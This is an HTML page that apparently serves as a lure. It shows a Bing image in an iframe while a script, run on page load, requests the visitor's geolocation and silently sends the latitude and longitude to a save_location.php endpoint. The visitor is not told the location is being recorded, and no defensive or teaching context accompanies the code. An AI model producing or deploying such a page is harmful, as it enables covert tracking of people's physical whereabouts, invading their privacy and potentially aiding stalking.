<!DOCTYPE html>
<html lang="en">
<head onload="getLocation()">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>getlocation</title>
</head>
<body onload="getLocation()">
    <iframe src="https://www.bing.com/images/blob?bcid=qIt1ehrWRiIFPA"></iframe>
    <p id="demo"></p>
</body>

<script>
    var x = document.getElementById("demo");
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
      } else {
        x.innerHTML = "Geolocation is not supported by this browser.";
      }
    }
    function showPosition(position) {
        const xhttp = new XMLHttpRequest();
        xhttp.open("GET", "save_location.php?lat="+ position.coords.latitude + "&long="+ position.coords.longitude);
        xhttp.send();
    }
</script>
</html>
